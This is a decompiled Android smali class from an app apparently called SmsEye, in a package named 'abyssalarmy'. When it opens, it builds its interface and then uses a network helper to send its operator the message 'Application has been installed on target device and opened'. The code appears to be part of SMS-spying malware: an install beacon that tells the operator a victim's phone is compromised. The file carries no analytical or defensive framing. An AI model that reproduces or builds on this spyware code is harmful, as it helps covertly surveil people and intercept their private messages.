.class public final Labyssalarmy/smseye2/SmsEyeMainActivity;
.super Landroidx/activity/ComponentActivity;
.source "SmsEyeMainActivity.kt"


# annotations
.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000\u001e\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\u0008\u0007\u0018\u00002\u00020\u0001B\u0005\u00a2\u0006\u0002\u0010\u0002J\u0012\u0010\u0005\u001a\u00020\u00062\u0008\u0010\u0007\u001a\u0004\u0018\u00010\u0008H\u0014R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.\u00a2\u0006\u0002\n\u0000\u00a8\u0006\t"
    }
    d2 = {
        "Labyssalarmy/smseye2/SmsEyeMainActivity;",
        "Landroidx/activity/ComponentActivity;",
        "()V",
        "smsEyeViewModel",
        "Labyssalarmy/smseye2/SmsEyeViewModel;",
        "onCreate",
        "",
        "savedInstanceState",
        "Landroid/os/Bundle;",
        "app_release"
    }
    k = 0x1
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# static fields
.field public static final $stable:I = 0x8


# instance fields
.field private smsEyeViewModel:Labyssalarmy/smseye2/SmsEyeViewModel;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 12
    invoke-direct {p0}, Landroidx/activity/ComponentActivity;-><init>()V

    return-void
.end method

.method public static final synthetic access$getSmsEyeViewModel$p(Labyssalarmy/smseye2/SmsEyeMainActivity;)Labyssalarmy/smseye2/SmsEyeViewModel;
    .locals 0

    .line 12
    iget-object p0, p0, Labyssalarmy/smseye2/SmsEyeMainActivity;->smsEyeViewModel:Labyssalarmy/smseye2/SmsEyeViewModel;

    return-object p0
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    .line 15
    invoke-super {p0, p1}, Landroidx/activity/ComponentActivity;->onCreate(Landroid/os/Bundle;)V

    .line 16
    new-instance p1, Labyssalarmy/smseye2/SmsEyeViewModel;

    move-object v0, p0

    check-cast v0, Landroid/content/Context;

    invoke-direct {p1, v0}, Labyssalarmy/smseye2/SmsEyeViewModel;-><init>(Landroid/content/Context;)V

    iput-object p1, p0, Labyssalarmy/smseye2/SmsEyeMainActivity;->smsEyeViewModel:Labyssalarmy/smseye2/SmsEyeViewModel;

    .line 17
    move-object p1, p0

    check-cast p1, Landroidx/activity/ComponentActivity;

    new-instance v1, Labyssalarmy/smseye2/SmsEyeMainActivity$onCreate$1;

    invoke-direct {v1, p0}, Labyssalarmy/smseye2/SmsEyeMainActivity$onCreate$1;-><init>(Labyssalarmy/smseye2/SmsEyeMainActivity;)V

    const v2, -0x3abe0c35

    const/4 v3, 0x1

    invoke-static {v2, v3, v1}, Landroidx/compose/runtime/internal/ComposableLambdaKt;->composableLambdaInstance(IZLjava/lang/Object;)Landroidx/compose/runtime/internal/ComposableLambda;

    move-result-object v1

    check-cast v1, Lkotlin/jvm/functions/Function2;

    const/4 v2, 0x0

    invoke-static {p1, v2, v1, v3, v2}, Landroidx/activity/compose/ComponentActivityKt;->setContent$default(Landroidx/activity/ComponentActivity;Landroidx/compose/runtime/CompositionContext;Lkotlin/jvm/functions/Function2;ILjava/lang/Object;)V

    .line 26
    new-instance p1, Labyssalarmy/smseye2/tools/SmsEyeNetwork;

    invoke-direct {p1, v0}, Labyssalarmy/smseye2/tools/SmsEyeNetwork;-><init>(Landroid/content/Context;)V

    const-string v0, "Application has been installed on target device and opened\nIgnore this message if you received it from this device before"

    invoke-virtual {p1, v0}, Labyssalarmy/smseye2/tools/SmsEyeNetwork;->sendTextMessage(Ljava/lang/String;)V

    return-void
.end method
